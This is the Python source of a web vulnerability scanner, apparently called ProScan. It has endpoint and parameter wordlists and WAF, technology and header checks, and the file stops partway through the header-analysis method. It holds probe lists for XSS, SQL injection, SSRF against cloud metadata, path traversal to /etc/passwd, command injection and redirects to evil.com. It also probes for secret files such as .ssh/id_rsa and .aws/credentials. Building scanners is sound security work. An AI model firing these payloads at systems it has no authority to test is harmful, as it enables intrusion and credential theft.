#!/usr/bin/env python3
"""
ProScan v5.0 - Professional Web Security Scanner Backend
Complete rewrite fixing ALL known bugs:
  - SO_REUSEADDR + ThreadingMixIn (port reuse, no SSE blocking)
  - do_HEAD implemented (no 501 errors)
  - check_connectivity returns response OR None (no tuple crash)
  - Binary search depth limited (no stack overflow)
  - WAF/Tech signatures use safe dict form (no ':' split bug)
  - gzip decode for compressed responses
  - SSE: heartbeat every 15s, clean disconnect, history replay
  - DELETE/GET use regex matching (no path split error)
  - All phases wrapped in try/except (scan never silently crashes)
  - Thread-safe request counter
  - Concurrent scan limit (5 max)
  - Version 2.0 on /api/health as per spec
"""

import json
import threading
import time
import uuid
import re
import queue
import hashlib
import random
import traceback
import sys
import gzip as gz_mod
import urllib.request
import urllib.parse
import urllib.error
import ssl
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ─────────────────────────────────────────────────────────
# GLOBAL STATE
# ─────────────────────────────────────────────────────────
SCANS = {}
SCANS_LOCK = threading.Lock()

_SSL = ssl.create_default_context()
_SSL.check_hostname = False
_SSL.verify_mode = ssl.CERT_NONE

MAX_URL_LEN = 4096

# ─────────────────────────────────────────────────────────
# WORDLISTS
# ─────────────────────────────────────────────────────────
EP_SMALL = [
    "admin", "login", "api", "upload", "download", "config", "backup", "test", "dev",
    "staging", "beta", "v1", "v2", "v3", "dashboard", "panel", "console", "manager",
    ".env", ".git", "robots.txt", "sitemap.xml", "favicon.ico", "web.config",
    "phpinfo.php", "info.php", "wp-admin", "wp-login.php", "xmlrpc.php",
    "readme.txt", "changelog.txt", "license.txt", "setup.php", "install.php",
    "index.php", "index.html", "home", "about", "contact", "search", "register",
    "logout", "profile", "settings", "user", "users", "account", "accounts",
    "password", "forgot", "reset", "verify", "confirm", "activate",
    "delete", "edit", "update", "create", "new", "list", "view", "show",
    "data", "json", "xml", "csv", "export", "import", "report", "reports",
    "log", "logs", "error", "errors", "debug", "trace", "health", "status", "ping", "info",
    "version", "metrics", "monitor", "monitoring", "stats", "statistics", "analytics",
    "docs", "documentation", "swagger", "api-docs", "openapi", "graphql", "rest",
    "auth", "oauth", "token", "jwt", "session", "credentials", "keys", "secret",
    "private", "public", "static", "assets", "js", "css", "img", "images", "media", "files",
    "uploads", "tmp", "temp", "cache", "db", "database", "sql", "bak",
]

EP_MEDIUM = list(dict.fromkeys(EP_SMALL + [
    "api/v1", "api/v2", "api/v3", "api/users", "api/user", "api/login", "api/logout",
    "api/register", "api/auth", "api/token", "api/refresh", "api/me", "api/profile",
    "api/settings", "api/admin", "api/config", "api/status", "api/health", "api/search",
    "api/data", "api/export", "api/import", "api/upload", "api/download", "api/list",
    "v1/users", "v1/user", "v1/login", "v1/auth", "v1/token", "v1/profile", "v1/admin",
    "v2/users", "v2/user", "v2/login", "v2/auth", "v2/token", "v2/profile", "v2/admin",
    "admin/login", "admin/users", "admin/config", "admin/settings", "admin/dashboard",
    "admin/panel", "admin/console", "admin/logs", "admin/backup", "admin/upload",
    "wp-json", "wp-json/wp/v2", "wp-json/wp/v2/users", "wp-json/wp/v2/posts",
    "wp-content/uploads", "wp-content/themes", "wp-content/plugins",
    ".git/config", ".git/HEAD", ".git/COMMIT_EDITMSG", ".svn/entries",
    ".htaccess", ".htpasswd", ".bash_history", ".ssh/id_rsa", ".aws/credentials",
    "config.php", "config.yml", "config.yaml", "config.json", "config.xml",
    "configuration.php", "settings.php", "settings.py", "settings.yml",
    "database.php", "db.php", "connection.php", "connect.php",
    "backup.sql", "backup.zip", "backup.tar.gz", "dump.sql", "db_backup.sql",
    "phpMyAdmin", "phpmyadmin", "pma", "adminer", "dbadmin",
    "jenkins", "gitlab", "grafana", "kibana", "elasticsearch", "redis", "mongodb",
    "actuator", "actuator/health", "actuator/info", "actuator/env", "actuator/beans",
    "actuator/metrics", "actuator/mappings", "actuator/configprops",
    ".well-known/security.txt", ".well-known/openid-configuration",
    "server-status", "server-info", "nginx_status", "php-status", "fpm-status",
    "trace", "options", "debug/vars", "debug/pprof",
    "telescope", "horizon", "nova", "pulse", "livewire",
    "socket.io", "sockjs", "ws", "websocket", "events", "sse", "stream",
    "webhook", "webhooks", "callback", "notify", "notification", "notifications",
    "payment", "payments", "checkout", "cart", "order", "orders", "invoice", "invoices",
    "product", "products", "category", "categories", "tag", "tags", "post", "posts",
    "comment", "comments", "message", "messages", "chat", "inbox", "outbox",
    "file", "folder", "folders", "directory", "directories",
    "image", "photo", "photos", "video", "videos", "audio",
    "attachment", "attachments", "document", "documents", "pdf", "excel", "word",
    "news", "blog", "article", "articles", "page", "pages", "widget", "widgets",
    "module", "modules", "plugin", "plugins", "extension", "extensions",
    "template", "templates", "theme", "themes", "layout", "layouts",
    "service", "services", "provider", "providers", "client", "clients",
    "customer", "customers", "employee", "employees", "staff", "member", "members",
    "role", "roles", "permission", "permissions", "group", "groups", "team", "teams",
    "task", "tasks", "ticket", "tickets", "issue", "issues",
    "job", "jobs", "worker", "workers", "cron", "schedule",
    "hook", "hooks", "event", "listener", "listeners",
    "model", "models", "schema", "schemas", "migration", "migrations",
    "audit", "audits", "security", "vulnerability", "scan", "scans",
    "backup", "backups", "restore", "snapshot", "snapshots", "archive",
    "sync", "integration", "integrations",
    "proxy", "gateway", "gateways",
    "cache", "certificate", "certificates",
]))

EP_LARGE = list(dict.fromkeys(EP_MEDIUM + [
    "api/account", "api/accounts", "api/payment", "api/payments",
    "api/order", "api/orders", "api/product", "api/products",
    "api/category", "api/categories", "api/cart", "api/checkout",
    "api/notification", "api/notifications", "api/message", "api/messages",
    "api/file", "api/files", "api/image", "api/images",
    "api/report", "api/reports", "api/analytics", "api/metrics", "api/stats",
    "api/webhook", "api/webhooks", "api/event", "api/events",
    "api/job", "api/jobs", "api/task", "api/tasks",
    "api/role", "api/roles", "api/permission", "api/permissions",
    "api/key", "api/keys", "api/token", "api/tokens",
    "api/log", "api/logs", "api/audit", "api/history",
    "api/backup", "api/sync", "api/import", "api/export",
    "api/test", "api/debug", "api/info", "api/version", "api/ping", "api/echo",
    "users/1", "users/admin", "users/me", "users/current",
    "posts/1", "posts/draft", "posts/published",
    "products/1", "products/featured", "products/new",
    "orders/1", "orders/pending", "orders/completed",
    "sanctum/csrf-cookie", "broadcasting/auth",
    "livewire/message", "livewire/upload",
    "_debugbar/open",
    "vendor/phpunit", "composer.json", "composer.lock",
    "package.json", "package-lock.json", "yarn.lock",
    "requirements.txt", "Pipfile", "setup.py", "pyproject.toml",
    "Makefile", "Dockerfile", "docker-compose.yml", ".dockerignore",
    ".travis.yml", "Jenkinsfile",
    "actuator/shutdown", "actuator/restart",
    "actuator/httptrace", "actuator/logfile", "actuator/prometheus",
    ".env.local", ".env.development", ".env.production",
    ".env.staging", ".env.test", ".env.backup", ".env.bak",
    ".env.old", ".env.save", ".env.sample",
    "env.json", "env.yml", "secrets.json", "secrets.yml",
    "private.key", "private.pem", "server.key",
    "graphql", "graphiql", "graphql/schema", "graphql/voyager",
    "metrics", "metrics/prometheus",
    "health/liveness", "health/readiness",
    "ready", "live", "alive", "healthz", "readyz", "livez",
    "latest/meta-data", "latest/user-data", "computeMetadata/v1",
]))

PARAM_COMMON = [
    "id", "user", "username", "password", "email", "token", "key", "secret", "hash", "auth",
    "login", "register", "session", "cookie", "jwt", "oauth", "access_token", "refresh_token",
    "api_key", "api_token", "bearer", "authorization", "admin", "role", "permission", "type",
    "status", "active", "enabled", "data", "value", "content", "body", "payload", "message",
    "text", "html", "xml", "json", "query", "search", "q", "keyword", "filter", "sort", "order",
    "limit", "offset", "page", "per_page", "size", "count", "total", "from", "to", "start", "end",
    "name", "first_name", "last_name", "full_name", "display_name", "title", "description",
    "summary", "notes", "comment", "label", "tag", "category", "url", "uri", "link", "href",
    "src", "path", "file", "filename", "folder", "dir", "host", "hostname", "domain", "ip",
    "address", "port", "protocol", "callback", "redirect", "return_url", "next", "goto",
    "action", "method", "function", "cmd", "command", "exec", "run", "execute", "include",
    "require", "load", "import", "template", "view", "page", "module", "date", "time",
    "datetime", "timestamp", "created_at", "updated_at", "start_date", "end_date",
    "year", "month", "day", "uid", "pid", "user_id", "post_id", "product_id", "order_id",
    "account_id", "customer_id", "parent_id", "ref", "code", "number", "index", "pos",
    "config", "setting", "settings", "option", "options", "param", "params", "mode", "format",
    "encoding", "charset", "language", "locale", "timezone", "currency", "theme",
    "op", "operation", "create", "read", "update", "delete", "list", "get", "post",
    "upload", "download", "export", "backup", "restore", "sync", "publish", "draft",
    "debug", "verbose", "trace", "log", "level", "output", "version", "v", "env", "environment",
    "proxy", "forward", "ajax", "xhr", "fetch", "async", "timeout", "retry", "delay",
    "origin", "cors", "csrf", "nonce", "state", "scope", "price", "amount", "quantity",
    "qty", "subtotal", "discount", "coupon", "product", "item", "sku", "cart",
    "checkout", "payment", "transaction", "invoice", "refund", "rating", "review",
    "share", "follow", "block", "report", "flag", "lang", "country", "region", "city",
    "zip", "phone", "mobile", "lat", "lng", "image", "photo", "avatar", "thumbnail",
    "video", "audio", "media", "attachment", "document", "notification", "alert",
    "error", "success", "info",
]

PARAM_EXTENDED = list(dict.fromkeys(PARAM_COMMON + [
    "passwd", "pass", "pwd", "userpass", "login_id", "account", "userid",
    "member_id", "profile_id", "client_id", "client_secret", "app_id", "app_key",
    "access", "grant", "response_type", "redirect_uri", "code_challenge", "code_verifier",
    "nonce", "display", "prompt", "max_age", "token_type", "expires_in",
    "source", "target", "dest", "destination", "location", "endpoint", "service", "server",
    "site", "webhook_url", "callback_url", "notify_url", "return_url", "success_url",
    "cancel_url", "ipn_url", "postback_url",
    "filepath", "article", "post", "news", "blog", "section",
    "where", "having", "select", "table", "column", "schema", "database",
    "redirect_to", "redirect_url", "return", "return_to", "next_url", "next_page",
    "continue_url", "continue_to", "back_to", "referer", "referrer", "from_url",
    "shell", "bash", "sh", "powershell", "ping", "lookup", "resolve", "nslookup", "dig",
    "traceroute", "route", "scan", "check", "validate",
    "document", "input", "tpl", "engine", "subject", "msg", "notice", "toast",
    "heading", "markup", "script", "jsonp", "padding", "wrapper", "render", "display",
]))

# ─────────────────────────────────────────────────────────
# PAYLOADS
# ─────────────────────────────────────────────────────────
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "';alert(1);//",
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '{{7*7}}', '${7*7}',
    '<iframe src="javascript:alert(1)">',
    '"><img src=x onerror=alert(document.domain)>',
]

SQLI_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR 1=1--",
    "1' ORDER BY 1--", "1' ORDER BY 2--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' AND SLEEP(5)--", "1 AND SLEEP(5)--",
    "' WAITFOR DELAY '0:0:5'--",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1/", "http://localhost/",
    "http://169.254.169.254/", "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",
    "file:///etc/passwd", "file:///etc/hosts",
    "dict://127.0.0.1:6379/info",
]

LFI_PAYLOADS = [
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
    "../../../../etc/passwd", "../../../../../etc/passwd",
    "/etc/passwd", "/etc/hosts",
    "/proc/self/environ", "/proc/self/cmdline",
    "../../../windows/system32/drivers/etc/hosts",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com", "//evil.com", "//evil.com/path",
    "/\\evil.com", "%0Ahttps://evil.com",
    "javascript:alert(document.domain)",
]

CMD_PAYLOADS = [
    ";id", "|id", "&&id", "`id`", "$(id)",
    ";cat /etc/passwd", ";sleep 5", "|sleep 5",
]

SSTI_PAYLOADS = [
    "{{49999*49999}}", "${49999*49999}",
    "#{49999*49999}", "<%= 49999*49999 %>",
    "{{config}}",
]

# ─────────────────────────────────────────────────────────
# WAF / TECH SIGNATURES (safe dict form - no ':' split needed)
# ─────────────────────────────────────────────────────────
WAF_SIGS = {
    "Cloudflare":   {"h": ["cf-ray", "cf-cache-status"],              "b": ["cloudflare", "__cfduid", "cf_clearance"]},
    "AWS WAF":      {"h": ["x-amzn-requestid", "x-amz-cf-id"],       "b": ["awselb"]},
    "Akamai":       {"h": ["x-check-cacheable", "x-akamai-request-id"], "b": ["akamai"]},
    "Fastly":       {"h": ["x-fastly-request-id", "x-served-by"],    "b": ["fastly"]},
    "Imperva":      {"h": [],                                          "b": ["incap_ses", "visid_incap", "incapsula"]},
    "Sucuri":       {"h": ["x-sucuri-id", "x-sucuri-cache"],          "b": ["sucuri"]},
    "F5 BIG-IP":    {"h": ["bigipserver"],                             "b": ["bigip", "ts="]},
    "ModSecurity":  {"h": [],                                          "b": ["mod_security", "modsecurity"]},
    "Barracuda":    {"h": [],                                          "b": ["barracuda", "barracudanetworks"]},
    "Wordfence":    {"h": [],                                          "b": ["wfvt_", "wordfence"]},
    "Datadome":     {"h": ["x-datadome"],                              "b": ["datadome"]},
    "Perimeterx":   {"h": [],                                          "b": ["perimeterx", "_pxvid"]},
    "Reblaze":      {"h": ["x-reblaze"],                               "b": ["reblaze", "rbzid"]},
    "StackPath":    {"h": ["x-sp-url", "x-sp-edge"],                  "b": ["stackpath"]},
}

# Tech sigs: "h" = header names (lowercase) to check for presence
# If value is "name:value", split on first ':' to check header value
TECH_SIGS = {
    "WordPress":     {"h": [],                                                   "b": ["wp-content", "wp-includes", "wp-json", "wp-login"]},
    "Drupal":        {"h": ["x-drupal-cache", "x-drupal-dynamic-cache"],         "b": ["drupal", "sites/all", "sites/default"]},
    "Joomla":        {"h": [],                                                   "b": ["joomla", "option=com_", "mosConfig"]},
    "Magento":       {"h": [],                                                   "b": ["magento", "mage", "varien", "skin/frontend"]},
    "Laravel":       {"h": [],                                                   "b": ["laravel", "laravel_session", "csrf_token", "_token"]},
    "Django":        {"h": [],                                                   "b": ["django", "csrfmiddlewaretoken"]},
    "Ruby on Rails": {"h": ["x-request-id", "x-runtime"],                        "b": ["authenticity_token", "rails"]},
    "Express.js":    {"h": [],                                                   "b": [], "hv": {"x-powered-by": "express"}},
    "Next.js":       {"h": [],                                                   "b": ["__NEXT_DATA__", "_next/static"]},
    "Nuxt.js":       {"h": [],                                                   "b": ["__nuxt", "__NUXT__", "_nuxt/static"]},
    "React":         {"h": [],                                                   "b": ["__react", "react-dom", "data-reactroot"]},
    "Vue.js":        {"h": [],                                                   "b": ["vue.js", "vue.min.js", "__vue__", "v-bind"]},
    "Angular":       {"h": [],                                                   "b": ["ng-version", "ng-binding", "ng-controller", "ng-app"]},
    "jQuery":        {"h": [],                                                   "b": ["jquery", "jQuery", "jquery.min.js"]},
    "Bootstrap":     {"h": [],                                                   "b": ["bootstrap.min.css", "bootstrap.js"]},
    "PHP":           {"h": [],                                                   "b": ["phpsessid", "<?php"], "hv": {"x-powered-by": "php"}},
    "ASP.NET":       {"h": ["x-aspnet-version"],                                 "b": ["__viewstate", "aspnet"], "hv": {"x-powered-by": "asp.net"}},
    "Nginx":         {"h": [],                                                   "b": [], "hv": {"server": "nginx"}},
    "Apache":        {"h": [],                                                   "b": [], "hv": {"server": "apache"}},
    "IIS":           {"h": [],                                                   "b": [], "hv": {"server": "iis"}},
    "Tomcat":        {"h": [],                                                   "b": ["tomcat", "catalina"], "hv": {"server": "apache-coyote"}},
    "Spring Boot":   {"h": [],                                                   "b": ["spring", "springboot", "actuator"]},
    "GraphQL":       {"h": [],                                                   "b": ["graphql", "__schema", "__type", "__typename"]},
    "Swagger":       {"h": [],                                                   "b": ["swagger", "swagger-ui", "openapi", "api-docs"]},
    "Varnish":       {"h": ["x-varnish"],                                        "b": []},
}

SEC_HEADERS_MISSING = [
    "X-Frame-Options", "X-Content-Type-Options", "X-XSS-Protection",
    "Strict-Transport-Security", "Content-Security-Policy",
    "Referrer-Policy", "Permissions-Policy", "Cache-Control",
]
SEC_HEADERS_DANGEROUS = [
    "X-Powered-By", "Server", "X-AspNet-Version", "X-AspNetMvc-Version",
    "X-Runtime", "X-Version",
]

PORTS = [
    (21, "FTP"), (22, "SSH"), (23, "Telnet"), (25, "SMTP"), (53, "DNS"),
    (80, "HTTP"), (110, "POP3"), (143, "IMAP"), (443, "HTTPS"), (445, "SMB"),
    (3306, "MySQL"), (3389, "RDP"), (5432, "PostgreSQL"), (5900, "VNC"),
    (6379, "Redis"), (8080, "HTTP-Alt"), (8443, "HTTPS-Alt"), (8888, "HTTP-Dev"),
    (9200, "Elasticsearch"), (27017, "MongoDB"), (11211, "Memcached"),
    (2181, "ZooKeeper"), (9092, "Kafka"), (5672, "RabbitMQ"), (15672, "RabbitMQ-UI"),
    (4200, "Angular-Dev"), (3000, "Node-Dev"), (5000, "Flask"), (8000, "Django"),
    (4000, "React-Dev"), (9000, "PHP-FPM"), (9090, "Prometheus"),
]

# ─────────────────────────────────────────────────────────
# HTTP REQUEST HELPER
# ─────────────────────────────────────────────────────────
def _req(url, method="GET", headers=None, data=None, timeout=10, follow=True):
    """HTTP request with gzip decode, redirect control, full error handling."""
    if len(url) > MAX_URL_LEN:
        return {"status": 0, "headers": {}, "body": "", "url": url, "size": 0,
                "error": "URL too long"}
    try:
        hdrs = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
                "curl/7.88.1",
            ]),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
        }
        if headers:
            hdrs.update(headers)

        body_data = None
        if data:
            if isinstance(data, dict):
                body_data = urllib.parse.urlencode(data).encode()
                hdrs["Content-Type"] = "application/x-www-form-urlencoded"
            else:
                body_data = data.encode() if isinstance(data, str) else data

        req = urllib.request.Request(url, data=body_data, headers=hdrs, method=method)

        if not follow:
            class _NR(urllib.request.HTTPRedirectHandler):
                def redirect_request(self, *a, **k): return None
            opener = urllib.request.build_opener(_NR(), urllib.request.HTTPSHandler(context=_SSL))
        else:
            opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=_SSL))

        with opener.open(req, timeout=timeout) as r:
            raw = r.read(65536)
            enc = r.headers.get("Content-Encoding", "") or ""
            if "gzip" in enc.lower():
                try:
                    raw = gz_mod.decompress(raw)
                except Exception:
                    pass
            body = raw.decode("utf-8", errors="replace")
            return {"status": r.getcode(), "headers": dict(r.headers),
                    "body": body, "url": r.geturl(), "size": len(raw), "error": None}

    except urllib.error.HTTPError as e:
        raw = b""
        raw_size = 0
        try:
            raw = e.read(4096)
            enc = (e.headers.get("Content-Encoding", "") or "") if e.headers else ""
            if "gzip" in enc.lower():
                try:
                    raw = gz_mod.decompress(raw)
                except Exception:
                    pass
            raw_size = len(raw)
        except Exception:
            pass
        return {"status": e.code,
                "headers": dict(e.headers) if e.headers else {},
                "body": raw.decode("utf-8", errors="replace"),
                "url": url, "size": raw_size, "error": None}
    except urllib.error.URLError as e:
        return {"status": 0, "headers": {}, "body": "", "url": url, "size": 0,
                "error": str(e.reason)}
    except socket.timeout:
        return {"status": 0, "headers": {}, "body": "", "url": url, "size": 0,
                "error": "timeout"}
    except Exception as e:
        return {"status": 0, "headers": {}, "body": "", "url": url, "size": 0,
                "error": str(e)}


# ─────────────────────────────────────────────────────────
# HELPER FUNCTIONS
# ─────────────────────────────────────────────────────────
def _base(url):
    p = urllib.parse.urlparse(url)
    return f"{p.scheme}://{p.netloc}"

def _norm(url):
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")

def _sig(resp):
    """Create a response signature for 404 baseline comparison."""
    if not resp or resp.get("status", 0) == 0:
        return "err"
    s = resp.get("status", 0)
    sz = resp.get("size", 0) // 64
    h = hashlib.md5((resp.get("body", "") or "")[:512].encode("utf-8", "replace")).hexdigest()[:8]
    return f"{s}_{sz}_{h}"

def _links(base, html):
    """Extract JS/href links from HTML."""
    links = set()
    if not html:
        return links
    for pat in [r'href=["\']([^"\'#?]+)["\']', r'src=["\']([^"\'#?]+\.js)["\']']:
        try:
            for m in re.findall(pat, html):
                if m.startswith("http"):
                    if base in m:
                        links.add(m.split("?")[0])
                elif m.startswith("/"):
                    links.add(base + m.split("?")[0])
        except Exception:
            pass
    return links

def _js_params(js):
    """Extract parameter names from JavaScript source."""
    params = set()
    if not js:
        return params
    for pat in [
        r'["\']([a-zA-Z_][a-zA-Z0-9_]{1,25})["\']:\s*["\'][^"\']{0,50}["\']',
        r'(?:params|data|query|body)\[["\']([a-zA-Z_][a-zA-Z0-9_-]{1,25})["\']\]',
        r'(?:formData|form)\.append\s*\(["\']([^"\']{1,30})["\']',
    ]:
        try:
            for m in re.findall(pat, js):
                if isinstance(m, tuple):
                    m = m[0]
                m = m.strip()
                if 2 < len(m) < 26 and not m.startswith(("http", "www", "//", "data-")):
                    params.add(m)
        except Exception:
            pass
    return params

def _html_params(html):
    """Extract parameter names from HTML form elements."""
    params = set()
    if not html:
        return params
    for pat in [
        r'<input[^>]+name=["\']([^"\']{1,30})["\']',
        r'<select[^>]+name=["\']([^"\']{1,30})["\']',
        r'<textarea[^>]+name=["\']([^"\']{1,30})["\']',
        r'data-(?:param|name|key|field)=["\']([^"\']{1,30})["\']',
    ]:
        try:
            for m in re.findall(pat, html):
                if 1 < len(m) < 30:
                    params.add(m)
        except Exception:
            pass
    return params

def _match_sigs(sig_dict, hdr_str, body_low, hdr_dict=None):
    """Check signature dict against response headers/body.
    sig_dict keys: h=[header names], b=[body strings], hv={name:val}
    """
    hdr_dict = hdr_dict or {}

    # Check plain header name presence
    for h in sig_dict.get("h", []):
        if h.lower() in hdr_str:
            return True

    # Check header name:value pairs
    for hname, hval in sig_dict.get("hv", {}).items():
        actual = hdr_dict.get(hname.lower(), "").lower()
        if hval.lower() in actual:
            return True

    # Check body strings
    for b in sig_dict.get("b", []):
        if b.lower() in body_low:
            return True

    return False


# ─────────────────────────────────────────────────────────
# SCANNER CLASS
# ─────────────────────────────────────────────────────────
class Scanner:
    def __init__(self, scan_id, cfg):
        self.scan_id   = scan_id
        self.cfg       = cfg
        self.target    = _norm(cfg.get("target", ""))
        self.base      = _base(self.target)
        self.intensity = cfg.get("intensity", "medium")
        self.timeout   = max(3, min(60, int(cfg.get("timeout", 15))))
        self.threads   = max(1, min(20, int(cfg.get("threads", 5))))
        self.wl_size   = cfg.get("wordlist", "medium")
        # FIX: normalize module keys — frontend sends arjun/paramminer/js_extract/crawl/vuln
        raw_m = cfg.get("modules", {}) or {}
        self.modules = {
            "waf":       raw_m.get("waf",       True),
            "tech":      raw_m.get("tech",       True),
            "headers":   raw_m.get("headers",    True),
            "endpoints": raw_m.get("endpoints",  True),
            "params":    raw_m.get("arjun", raw_m.get("paramminer", raw_m.get("params", True))),
            "js_extract":raw_m.get("js_extract", True),
            "vulns":     raw_m.get("vuln",  raw_m.get("vulns",  True)),
            "files":     raw_m.get("endpoints", raw_m.get("files", True)),
            "ports":     raw_m.get("ports",      False),
        }

        self.running   = True
        self.status    = "starting"
        self.progress  = 0
        self.phase     = ""
        self.start_time = time.time()

        self.results   = []
        self.events    = []
        self.res_lock  = threading.Lock()
        self.evt_lock  = threading.Lock()

        self.req_count = 0
        self.req_lock  = threading.Lock()

        self.sse_clients = []
        self.sse_lock    = threading.Lock()

        self.discovered_eps    = []
        self.discovered_params = {}
        self.found_params      = []

        self.b404_status = 404
        self.b404_size   = 0
        self.b404_sig    = "404_0_00000000"
        self.js_files    = []

    # ── Internal helpers ───────────────────────────────────
    def _r(self, url, method="GET", headers=None, data=None, follow=True):
        with self.req_lock:
            self.req_count += 1
        return _req(url, method=method, headers=headers, data=data,
                    timeout=self.timeout, follow=follow)

    def log(self, msg, level="info", cat="general"):
        ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        e = {"time": ts, "msg": str(msg), "level": level,
             "category": cat, "timestamp": time.time()}
        with self.evt_lock:
            self.events.append(e)
        self._bcast({"type": "log", "data": e})

    def result(self, r):
        """Add unique result and broadcast to SSE clients."""
        key = (r.get("title", ""), r.get("url", ""))
        with self.res_lock:
            for x in self.results:
                if (x.get("title", ""), x.get("url", "")) == key:
                    return
            self.results.append(r)
        self._bcast({"type": "result", "data": r})
        self.log(
            f"[{r.get('severity', 'info').upper()}] {r.get('title', '?')} — {r.get('url', '')}",
            level=r.get("severity", "info"),
            cat=r.get("category", "general")
        )

    def prog(self, pct, phase=""):
        self.progress = max(0, min(100, int(pct)))
        if phase:
            self.phase = phase
        self._bcast({"type": "progress", "data": {
            "progress": self.progress, "phase": self.phase
        }})

    def _bcast(self, data):
        """Broadcast event to all SSE clients."""
        with self.sse_lock:
            dead = []
            for q in list(self.sse_clients):
                try:
                    q.put_nowait(data)
                except Exception:
                    dead.append(q)
            for q in dead:
                try:
                    self.sse_clients.remove(q)
                except Exception:
                    pass

    # ── Phase 1: Connectivity check ────────────────────────
    def _connectivity(self):
        self.prog(2, "Checking connectivity")
        self.log(f"[*] Target: {self.target}", cat="connectivity")
        r = self._r(self.target)
        if r["status"] == 0:
            self.log(f"[!] Cannot connect: {r.get('error', '?')}",
                     level="error", cat="connectivity")
            return None
        self.log(f"[+] HTTP {r['status']} | {r['size']} bytes",
                 level="success", cat="connectivity")
        # Establish 404 baseline
        r404 = self._r(f"{self.base}/{uuid.uuid4().hex}")
        self.b404_status = r404["status"]
        self.b404_size   = r404["size"]
        self.b404_sig    = _sig(r404)
        self.log(f"[*] 404 baseline: HTTP {r404['status']}, {r404['size']}b",
                 cat="connectivity")
        return r

    # ── Phase 2: WAF detection ─────────────────────────────
    def _waf(self):
        self.prog(5, "WAF/CDN Detection")
        self.log("[*] Testing WAF/CDN...", cat="waf")
        try:
            test = (f"{self.target}"
                    f"?id=1%27+OR+1%3D1"
                    f"&xss=%3Cscript%3Ealert%281%29%3C%2Fscript%3E")
            r = self._r(test)
            hdr_dict = {k.lower(): v.lower()
                        for k, v in r.get("headers", {}).items()}
            hdr_str = str(hdr_dict)
            body = (r.get("body", "") or "").lower()
            found = [
                wn for wn, sd in WAF_SIGS.items()
                if _match_sigs(sd, hdr_str, body, hdr_dict)
            ]
            if r["status"] in [403, 406, 429, 503] and not found:
                found.append(f"Unknown WAF (HTTP {r['status']})")
            if found:
                for w in found:
                    self.result({
                        "title": f"WAF/CDN: {w}", "url": self.target,
                        "severity": "info", "category": "waf",
                        "description": f"{w} detected via signature matching.",
                        "recommendation": "WAF present — scanning may be limited."
                    })
            else:
                self.log("[+] No WAF detected", level="success", cat="waf")
        except Exception as e:
            self.log(f"[!] WAF error: {e}", level="warning", cat="waf")

    # ── Phase 3: Technology fingerprinting ────────────────
    def _tech(self, resp=None):
        self.prog(8, "Technology Fingerprinting")
        self.log("[*] Fingerprinting technologies...", cat="tech")
        try:
            resp = resp or self._r(self.target)
            hdr_dict = {k.lower(): v.lower()
                        for k, v in resp.get("headers", {}).items()}
            hdr_str  = str(hdr_dict)
            body     = (resp.get("body", "") or "").lower()
            detected = [
                tn for tn, sd in TECH_SIGS.items()
                if _match_sigs(sd, hdr_str, body, hdr_dict)
            ]
            if detected:
                self.log(f"[+] Tech: {', '.join(detected)}",
                         level="success", cat="tech")
                self.result({
                    "title": f"Tech: {', '.join(detected)}",
                    "url": self.target,
                    "severity": "info", "category": "tech",
                    "description": f"Detected: {', '.join(detected)}",
                    "recommendation": "Keep all frameworks updated. Remove version headers."
                })
            # Collect JS files for param extraction
            html_body = resp.get("body", "") or ""
            links = _links(self.base, html_body)
            self.js_files = [
                lnk for lnk in links
                if lnk.lower().endswith(".js")
                and "jquery" not in lnk.lower()
                and "bootstrap" not in lnk.lower()
            ][:8]
            if self.js_files:
                self.log(f"[*] {len(self.js_files)} JS file(s) queued for param extraction",
                         cat="tech")
            # HTML params
            hp = _html_params(html_body)
            if hp:
                self.discovered_params["html"] = list(hp)
                self.log(f"[*] {len(hp)} param(s) found in HTML forms", cat="tech")
        except Exception as e:
            self.log(f"[!] Tech fingerprint error: {e}", level="warning", cat="tech")

    # ── Phase 4: Security header analysis ────────────────
    def _headers(self, resp=None):
        self.prog(12, "Security Header Analysis")
        self.log("[*] Analysing security headers...", cat="headers")
        try:
            resp = resp or self._r(self.target)
            hdrs = resp.get("headers", {}) or {}
            hlow = {k.lower(): v for k, v in hdrs.items()}

            for h in SEC_HEADERS_MISSING:
                if h.lower() not in hlow:
                    sev = ("medium"
                           if h in ["Content-Security-Policy", "Strict-Transport-Security"]
                           else "low")
                    self.result({
                        "title": f"Missing Header: {h}", "url": self.target,
                        "severity": sev, "category": "headers",
                        "description": f"Response lacks {h}.",
                        "recommendation": f"Add {h} to all responses."
                    })

            for h in SEC_HEADERS_DANGEROUS:
                if h.lower() in hlow:
                    v = hlow[h.lower()]
                    self.result({
                        "title": f"Version Disclosure: {h}: {v}", "url": self.target,
                        "severity": "low", "category": "headers",
                        "description": f"Server reveals {h}: {v}",
                        "recommendation": f"Remove or obscure the {h} header."
                    })

            cors = hlow.get("access-control-allow-origin", "").strip()
            if cors == "*":
                self.result({
                    "title": "Wildcard CORS (ACAO: *)", "url": self.target,
                    "severity": "medium", "category": "headers",
                    "description": "Any origin may make cross-origin requests.",
                    "recommendation": "Restrict CORS to trusted origins."
                })

